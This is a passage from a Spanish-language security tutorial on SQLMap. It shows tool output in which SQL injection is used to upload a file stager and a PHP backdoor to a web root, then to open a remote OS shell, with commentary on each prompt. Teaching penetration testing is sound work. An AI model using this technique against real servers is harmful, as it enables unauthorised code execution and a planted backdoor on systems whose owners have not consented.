...SNIP...
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4

do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y

[18:06:07] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1

[18:06:09] [WARNING] unable to automatically parse any web server path
[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:06:09] [WARNING] potential permission problems detected ('Permission denied')
[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'
[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la

do you want to retrieve the command standard output? [Y/n/a] a

command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...
```

Como podemos ver, esta vez SQLMap nos dejó caer con éxito en un shell remoto interactivo fácil, dándonos una ejecución remota de código fácil a través de este SQLi.

Nota: SQLMap primero nos pidió el tipo de lenguaje utilizado en este servidor remoto, que sabemos que es PHP. Luego nos pidió el directorio raíz web del servidor, y le pedimos a SQLMap que lo encontrara automáticamente usando 'common location(s)'. Ambas opciones son las opciones predeterminadas, y se habrían elegido automáticamente si hubiéramos agregado la opción '- lote' a SQLMap.

Con esto, hemos cubierto toda la funcionalidad principal de SQLMap.